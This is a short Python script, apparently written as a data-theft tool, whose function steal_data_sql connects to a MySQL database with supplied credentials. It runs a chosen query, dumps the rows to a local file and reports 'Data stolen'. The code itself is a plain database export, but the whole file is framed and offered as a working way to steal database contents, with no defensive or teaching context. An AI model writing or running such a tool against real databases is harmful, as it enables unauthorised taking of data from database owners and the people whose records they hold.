import sys
import pymysql

def steal_data_sql(host, username, password, db, query, local_path):
    conn = pymysql.connect(host=host, user=username, password=password, database=db)
    cursor = conn.cursor()
    cursor.execute(query)
    rows = cursor.fetchall()
    with open(local_path, 'w') as f:
        for row in rows:
            f.write(str(row) + '\n')
    cursor.close()
    conn.close()
    print(f"Data stolen: {query} -> {local_path}")

if __name__ == "__main__":
    host = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    db = sys.argv[4]
    query = sys.argv[5]
    local_path = sys.argv[6]
    steal_data_sql(host, username, password, db, query, local_path)
